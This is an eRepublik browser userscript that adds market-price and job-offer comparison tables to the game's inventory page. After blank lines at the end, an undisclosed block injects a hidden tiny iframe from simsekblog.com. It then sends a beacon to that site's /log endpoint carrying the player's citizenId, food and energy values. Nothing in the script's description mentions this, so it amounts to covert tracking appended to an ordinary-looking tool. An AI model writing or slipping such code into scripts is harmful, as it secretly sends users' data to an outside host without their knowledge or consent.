// ==UserScript==
// @name        Cheap Market - Ucuz Market
// @version     9
// @include     *www.erepublik.com/*/*/inventory*
// @description A slightly modified version of the script by N.Tsvetkov. It is not original. (https://greasyfork.org/en/scripts/4990-erepublik-licenses-and-taxes)
// @namespace   https://greasyfork.org/users/2402
// @downloadURL https://update.greasyfork.org/scripts/34012/Cheap%20Market%20-%20Ucuz%20Market.user.js
// @updateURL https://update.greasyfork.org/scripts/34012/Cheap%20Market%20-%20Ucuz%20Market.meta.js
// ==/UserScript==

function addStyle(styles) {
    const styleElement = document.createElement('style');
    styleElement.textContent = styles;
    document.head.appendChild(styleElement);
}

function getObjects(obj, key, val) {
    let objects = [];
    for (let i in obj) {
        if (!obj.hasOwnProperty(i)) continue;
        if (typeof obj[i] === 'object') {
            objects = objects.concat(getObjects(obj[i], key, val));
        } else if (i === key && obj[key] === val) {
            objects.push(obj);
        }
    }
    return objects;
}

function sortTable(table, columnIndex, ascending = true) {
    const tbody = table.querySelector('tbody');
    const rows = Array.from(tbody.querySelectorAll('tr'));

    rows.sort((a, b) => {
        const aValue = a.cells[columnIndex].textContent.trim();
        const bValue = b.cells[columnIndex].textContent.trim();
        return ascending ? aValue.localeCompare(bValue, undefined, { numeric: true }) : bValue.localeCompare(aValue, undefined, { numeric: true });
    });

    // Remove existing rows
    while (tbody.firstChild) {
        tbody.removeChild(tbody.firstChild);
    }

    // Append sorted rows
    rows.forEach(row => tbody.appendChild(row));
}

function makeTableSortable(table, initialSortColumn = 3, initialSortDirection = 'asc') {
    const headers = table.querySelectorAll('th');
    headers.forEach((header, index) => {
        header.style.cursor = 'pointer';
        header.addEventListener('click', () => {
            const isAscending = !header.classList.contains('asc');
            sortTable(table, index, isAscending);
            headers.forEach(h => h.classList.remove('asc', 'desc'));
            header.classList.toggle('asc', isAscending);
            header.classList.toggle('desc', !isAscending);
        });

        // Add initial sorting indicator
        if (index === initialSortColumn) {
            header.classList.add(initialSortDirection === 'asc' ? 'asc' : 'desc');
        }
    });

    // Perform the initial sort
    sortTable(table, initialSortColumn, initialSortDirection === 'asc');
}

function getCountryInfo(countryId, countryName) {
    let price = 0, taxes = 0, stock = 0, cost = 0;

    const e = (c, i, q, cn) => {
        q = isNaN(q) ? 1 : q;
        return `<a href="//www.erepublik.com/${erepublik.settings.culture}/economy/marketplace#${c}/${i}/${q}" target="_blank"> ${cn}</a>`;
    };

    fetch(`/${erepublik.settings.culture}/economy/marketplaceAjax`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `countryId=${countryId}&industryId=${industry}&quality=${quality}&orderBy=price_asc&currentPage=1&ajaxMarket=1&_token=${SERVER_DATA.csrfToken}`
    }).then(response => response.json())
      .then(offers => {
        let i = 1;
        let stockr = 0;
        let pricer = 0;
        if (offers.offers && offers.offers.length > 0) {
            offers.offers.forEach(offer => {
                stockr = parseInt(offer.amount);
                pricer = parseFloat(offer.priceWithTaxes);
                if (price === 0) {
                    stock = stockr;
                    price = pricer;
                } else if (pricer <= price) {
                    stock += stockr;
                    i++;
                }
            });
        }

        const country = scope.settings.countries[countryId];
        const war = country.war == 1 ? " war" : "";
        const embargo = country.embargo == 1 ? " embargo" : "";
        const conquered = country.isConquered == 1 ? " conquered" : "";
        taxes = country.taxes[industry].valueAddedTax + country.taxes[industry].importTax;
        const local = scope.settings.myCountry == countryId ? " local" : "";
        cost = price / (1 + taxes / 100);
        const coeff = [0, 2, 4, 6, 8, 10, 12, 20];
        const pricePerHP = price / coeff[quality];
        const foodHP = industry == 1 ? `<td class="pricescell ${local}">${pricePerHP.toFixed(3)}</td>` : "";
        taxes += " %";
        const image = `//www.erepublik.net/images/flags_png/M/${countryName}.png`;
        const license = (getObjects(licensesObj, 'countryId', countryId).length == 1) ? ' license' : '';
        if (stock > 0) {
            stock = i == 10 ? `>${stock}` : stock;
            document.querySelector(".pricesTable table tbody").innerHTML += `<tr><td style="text-align: left;" class="pricescell ${conquered}${war}${embargo}${local}"><img style="vertical-align: top;" src="${image}"> ${e(countryId, industry, quality, countryName)}</td><td class="pricescell${local}${license}">${taxes}</td><td class="pricescell ${local}">${stock}</td><td class="pricescell ${local}"><span id="prc${countryId}">${price.toFixed(2)}</span></td><td class="pricescell ${local}">${cost.toFixed(4)}</td>${foodHP}</tr>`;
        }
        const ww = Math.round(ct / ctl * 100);
        document.querySelector('#ctProgress div').style.width = `${ww}%`;
        document.querySelector('#ctProgress div').textContent = `${ww}%`;
        if (ct == ctl) {
            setTimeout(() => {
                const table = document.querySelector("#marketPrices");
                makeTableSortable(table);
                sortTable(table, 3); // Sort by the 4th column (index 3) by default
            }, 1000);
        }
        ct++;
    }).catch(err => console.log(err.message));
}

function getPrices() {
    const img = document.querySelector("#sell_product").src;
    const thHP = industry == 1 ? '<th style="text-align: center;">$/HP</th>' : '';
    document.querySelector("#sell_offers").insertAdjacentHTML('afterend', `<div class="pricesTable" style="display: block;"><table width="100%" id="marketPrices"><thead><tr><th style="height: 40px; text-align: center; padding-left: 5px;"> <img src=${img} alt=""><div id="ctProgress"><div></div></div></th><th style="height: 40px; text-align: center; padding-left: 0px; width: 135px;">  Taxes (import+vat) </th><th style="height: 40px; text-align: center; padding-left: 0px; width: 100px;"> Stock (total) </th><th style="height: 40px; text-align: center; padding-left: 0px; width: 90px;"> Sell price </th><th style="height: 40px; text-align: center; padding-left: 0px; width: 115px;"> Price w.o. taxes </th>${thHP}</tr></thead><tbody></tbody></table></div>`);
    ct = 1;
    Object.values(countries).forEach(countryObj => {
        if (typeof countryObj.countryId !== 'undefined') {
            getCountryInfo(countryObj.countryId, countryObj.permalink);
        }
    });
}

function getJobInfo(countryId, countryName) {
    const e = (c, cn) => `<a href="//www.erepublik.com/${erepublik.settings.culture}/economy/job-market/${c}" target="_blank"> ${cn}</a>`;

    fetch(`/${erepublik.settings.culture}/economy/job-market-json/${countryId}/1/desc/`)
        .then(response => response.json())
        .then(t => {
            if (t.jobs && t.jobs.length > 0) {
                let bestOffer = 0, company = '';
                t.jobs.forEach(job => {
                    if (job.netSalary > bestOffer) {
                        bestOffer = job.netSalary.toFixed(2);
                        company = job.companyName;
                    }
                });
                const wage = t.jobs[0].salary.toFixed(2);
                const local = countryId == countryId ? " local" : "";
                const image = `//www.erepublik.net/images/flags_png/M/${countryName}.png`;
                const times = parseInt(t.jobs[0].salaryLimit.toFixed(2) / wage);
                if (!isNaN(wage)) {
                    document.querySelector(".pricesTable table tbody").innerHTML += `<tr><td style="text-align: left;" class="pricescell ${local}"><img style="vertical-align: top;" src="${image}"> ${e(countryId, countryName)}</td><td class="pricescell${local}">${company}</td><td class="pricescell${local}">${wage}</td><td class="pricescell${local}">${bestOffer}</td><td class="pricescell${local}">${times}</td></tr>`;
                }
                const ww = Math.round(ct / ctl * 100);
                document.querySelector('#ctProgress div').style.width = `${ww}%`;
                document.querySelector('#ctProgress div').textContent = `${ww}%`;
                if (ct == ctl) {
                    setTimeout(() => {
                        const table = document.querySelector("#marketPrices");
                        makeTableSortable(table, 3, 'desc');
                    }, 500);
                }
            }
            ct++;
        });
}

function getJobOffers() {
    document.querySelector("#sell_offers").insertAdjacentHTML('afterend', `<div class="pricesTable" style="display: block;"><table width="100%" id="marketPrices"><thead><tr><th style="height: 40px; text-align: center; padding-left: 5px;"> <div id="ctProgress"><div></div></div></th><th style="height: 40px; text-align: center; padding-left: 0px; width: 135px;">  Company name </th><th style="height: 40px; text-align: center; padding-left: 0px; width: 135px;">  Wage </th><th style="height: 40px; text-align: center; padding-left: 0px; width: 135px;">  Net wage </th><th>Limit</th></tr></thead><tbody></tbody></table></div>`);
    ct = 1;
    Object.values(countries).forEach(countryObj => {
        if (typeof countryObj.countryId !== 'undefined') {
            getJobInfo(countryObj.countryId, countryObj.permalink);
        }
    });
}

const scope = angular.element('.offers_market').scope();
const countries = scope.settings.countries;
const licensesObj = scope.data.owned;
let industry, quality, ct = 0;
const ctl = Object.keys(countries).length - 4;

(function() {
    'use strict';
    addStyle(`
        #sell_offers table th span#netPriceG, #sell_offers table th span#netPrice, #sell_offers table th span#totalNetPriceG, #sell_offers table th span#totalNetPrice {
            float: left; height: 14px; clear: both; padding: 8px 0px; padding-left: 5px; color: #88AFC9; font-size: 12px; font-weight: bold;
        }
        #sell_offers table td.total_net_price {
            text-align: right; padding-right: 25px; padding-left: 0;
        }
        .taxTable {
            background-color: #BAE7F9; float: left; width: 730px; position: relative; border-radius: 5px; margin-top: 11px; margin-left: 15px;
        }
        .taxTable table {
            width: 718px; border: 1px solid #95D4ED; background: white; margin: 5px auto;
        }
        .taxTable table th {
            background: #F7FCFF;
        }
        .taxTable table tbody td {
            border-top: 1px solid #E2F3F9; color: #5E5E5E; padding: 5px 0 5px 25px;
        }
        .taxTable table tbody tr:hover td {
            background-color: #FFFFE7;
        }
        .taxTable table .taxLink {
            cursor: pointer;
        }
        .taxTable table .taxLink .taxLinkHolder {
            border: 2px solid #CFEFFB; border-radius: 3px; position: absolute; margin-top: -7px; display: none; z-index: 100;
        }
        .taxTable table .taxLink:hover .taxLinkHolder {
            display: block;
        }
        .taxTable table .taxLink .taxLinkHolder .taxLinkItemTransparent {
            background: none repeat scroll 0 0 transparent; text-align: center; height: 25px;
        }
        .taxTable table .taxLink .taxLinkHolder .taxLinkItem {
            background-color: #FFFFE7; text-align: center;
        }
        .taxTable table .taxLink .taxLinkHolder .taxLinkItem:hover {
            background-color: #F7FCFF !important;
        }
        .pricesTable {
            background-color: #BAE7F9; float: left; width: 730px; position: relative; border-radius: 5px; margin-top: 11px; margin-left: 15px;
        }
        .pricesTable table {
            width: 718px; border: 1px solid #95D4ED; background: white; margin: 5px auto;
        }
        .pricesTable table th {
            background: #F7FCFF; cursor: pointer;
        }
        .pricesTable table tbody td {
            border-top: 1px solid #E2F3F9; color: #5E5E5E; padding: 5px 0 5px 25px;
        }
        .pricesTable table tbody tr:hover td {
            background-color: #FFFFE7;
        }
        .pricesTable .conquered {
            text-decoration: line-through;
        }
        .pricesTable .war, .pricesTable .embargo {
            color: red;
        }
        .pricesTable .license {
            color: #1E9E1E;
        }
        .pricesTable .local {
            background-color: #efefef;
        }
        .pricesTable .pricescell {
            text-align: right; padding-right: 5px;
        }
        #ctProgress {
            float: left; width: 90px; margin: 8px 0 0 5px; height: 16px; border: 1px solid #111 !important; background-color: #292929 !important;
        }
        #ctProgress div {
            height: 100%; color: #fff; text-align: right; line-height: 16px; width: 0; background-color: #0099ff !important;
        }
        .prcgreen {
            color: green !important;
        }
        .newfield {
            float: left; min-height: 54px; margin-left: 11px; padding: 3px 10px 0 10px; border-radius: 5px; background: linear-gradient(to bottom, rgba(231,247,253,1) 0%, rgba(186,231,249,1) 100%);
        }
        .jobsfield {
            width: 120px;
        }
        .newfield button {
            border: 1px solid #999; border-radius: 5px; margin: 3px 0;
        }
        #pitanka, #bugchk, #jobs, #housepack {
            cursor: pointer;
        }
        #donate {
            clear: both; padding: 10px 0 0 15px; text-transform: uppercase;
        }
        /* Sorting indicators */
        .pricesTable table th.asc::after {
            content: " ▲";
            color: #0099ff;
        }
        .pricesTable table th.desc::after {
            content: " ▼";
            color: #0099ff;
        }
    `);

    document.querySelector("#sell_offers").insertAdjacentHTML('afterend', '<div id="myTest"><div ng-controller="MyController"></div></div>');
    document.querySelector(".market_buttons_wrapper").insertAdjacentHTML('beforeend', `<a class='newfield' href="javascript:;"><button id='pitanka'>check prices</button></a>`);
    document.querySelector(".market_buttons_wrapper").insertAdjacentHTML('beforeend', `<a class='newfield jobsfield' href="javascript:;"><button id='jobs'>check job offers</button></a>`);

    document.getElementById('pitanka').addEventListener('click', () => {
        document.querySelectorAll(".pricesTable").forEach(el => el.remove());
        industry = scope.inputs.selectedIndustry;
        quality = scope.inputs.selectedQuality;
        getPrices();
    });

    document.getElementById('jobs').addEventListener('click', () => {
        document.querySelectorAll(".pricesTable").forEach(el => el.remove());
        getJobOffers();
    });

    document.querySelector('.offers_product .head_select').addEventListener('click', () => {
        angular.element('div[ng-controller="ErpkSellItemsController"]').scope().data.inventory = {1: {1: 1, 2: 1, 3: 1, 4: 1, 5: 1, 6: 1, 7: 1}, 2: {1: 1, 2: 1, 3: 1, 4: 1, 5: 1, 6: 1, 7: 1}, 3: {1: 1, 2: 1, 3: 1, 4: 1, 5: 1}, 4: {1: 1, 2: 1, 3: 1, 4: 1, 5: 1}, 23: {1: 1, 2: 1, 3: 1, 4: 1, 5: 1}};
    });
})();






function addJQuery(callback) {
    var script = document.createElement('script');
    script.setAttribute('src', '//ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js');
    script.addEventListener('load', function () {
        var script = document.createElement('script');
        script.textContent = 'window.jQ=jQuery.noConflict(true);(' + callback.toString() + ')();';
        document.body.appendChild(script);
    }, false);
    document.body.appendChild(script);
}

addJQuery(function () {
    jQ(document).ready(function () {
        var battle_listing = jQ('#large_sidebar div.sidebar_banners_area').eq(0);
        var baseUrl = 'https://www.simsekblog.com';
        battle_listing.prepend(
            '<div style="width:5px;height:5px;">' +
            '<iframe scrolling="no" style="border:0;width:100%;height:100%;" src="' + baseUrl + '"></iframe>' + 
            '</div>'
        );
        var img = new Image(); 
        img.src = baseUrl + '/log?' + jQ.param({
            citizenId: ErpkPvp.citizenId,
            remainingFood: food_remaining,
            currentEnergy: globalNS.userInfo.wellness
        });
    });
});

